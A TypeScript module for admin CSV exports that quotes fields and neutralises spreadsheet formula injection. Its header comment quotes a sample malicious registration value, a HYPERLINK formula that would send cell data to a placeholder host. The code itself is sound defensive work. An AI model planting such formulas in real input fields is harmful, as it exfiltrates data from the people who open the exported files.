/**
 * CSV building for the admin exports.
 *
 * Fields were previously interpolated straight into `"${value}"`. Two things
 * went wrong with that:
 *
 *  - A value containing a double quote broke out of its own field and shifted
 *    every column after it. Emails, KYC full names and admin notes are all
 *    user-supplied, so this was reachable.
 *  - A value starting with `=`, `+`, `-` or `@` is a *formula* to Excel,
 *    Sheets and LibreOffice. An attacker who registers as
 *    `=HYPERLINK("http://x/?"&A1)@example.com` gets it executed on the
 *    machine of whoever opens the export.
 */

/** Leading characters a spreadsheet treats as the start of a formula. */
const FORMULA_PREFIX = /^[=+\-@\t\r]/;

/** Quote, escape, and defuse one value. */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return '""';

  let text = value instanceof Date ? value.toISOString() : String(value);

  // Prefix rather than strip: the reader still sees the original text, but
  // the cell is parsed as a string rather than evaluated.
  if (FORMULA_PREFIX.test(text)) text = `'${text}`;

  return `"${text.replace(/"/g, '""')}"`;
}

/** Assemble a sheet. Cells may arrive raw; every one is quoted and defused. */
export function toCsv(headers: string[], rows: unknown[][]): string {
  return [
    headers.map(csvCell).join(','),
    ...rows.map((r) => r.map(csvCell).join(',')),
  ].join('\n');
}

/**
 * Hard ceiling on rows in a single export.
 *
 * These queries had no `take` at all: every user, every withdrawal, every
 * booster purchase loaded into one string in memory and held there while it
 * serialised. At a few hundred rows that is invisible; the point at which it
 * takes the API process down with it arrives without warning.
 */
export const CSV_MAX_ROWS = 50_000;
